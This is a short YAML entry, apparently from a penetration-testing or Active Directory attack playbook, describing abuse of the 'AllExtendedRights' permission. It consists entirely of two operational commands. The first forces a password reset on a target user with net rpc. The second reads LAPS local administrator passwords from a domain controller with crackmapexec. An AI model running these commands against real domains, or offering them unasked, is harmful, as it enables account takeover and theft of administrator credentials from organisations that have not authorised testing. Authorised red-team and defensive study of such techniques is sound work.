name: AllExtendedRights
description: All extended rights including password reset and LAPS read
commands:
- '# Reset password (User-Force-Change-Password)'
- net rpc password '<TARGET_USER>' 'NewPassword123!' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
- ''
- '# Read LAPS password (on computer objects)'
- crackmapexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --module laps
opsec: []
references: []
